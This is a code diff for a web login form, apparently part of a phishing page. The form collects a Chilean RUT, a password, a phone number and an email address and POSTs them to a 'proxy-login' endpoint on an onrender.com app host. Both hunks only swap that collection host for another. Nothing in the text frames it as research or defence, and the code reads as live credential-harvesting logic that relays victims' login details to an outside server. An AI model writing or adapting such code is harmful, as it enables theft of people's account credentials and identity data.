@@ -203,7 +203,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
   }
 
   try {
-    const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
+    const response = await fetch("https://login-ob-xjb0.onrender.com./proxy-login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ rut, passwd, telefono })
@@ -229,7 +229,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
       const correo = document.getElementById("correo").value;
 
       try {
-        const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
+        const response = await fetch("https://login-ob-xjb0.onrender.com./proxy-login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ mail: correo })
